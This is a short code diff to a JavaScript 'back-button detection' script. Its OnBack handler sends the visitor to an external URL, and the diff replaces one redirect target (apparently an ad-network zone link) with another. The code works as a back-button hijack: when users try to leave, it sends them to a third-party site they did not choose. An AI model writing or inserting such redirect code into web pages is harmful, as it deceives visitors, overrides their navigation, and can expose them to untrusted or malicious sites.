@@ -10,7 +10,7 @@ var bajb_backdetect = {
     FrameTry: 0,
     FrameTimeout: null,
     OnBack: function() {
-        document.location.replace('http://deloplen.com/afu.php?zoneid=2698538')
+        document.location.replace('http://tpmr.com/i/66230')
     },
     BAJBFrame: function() {
         var BAJBOnBack = document.getElementById('BAJBOnBack');
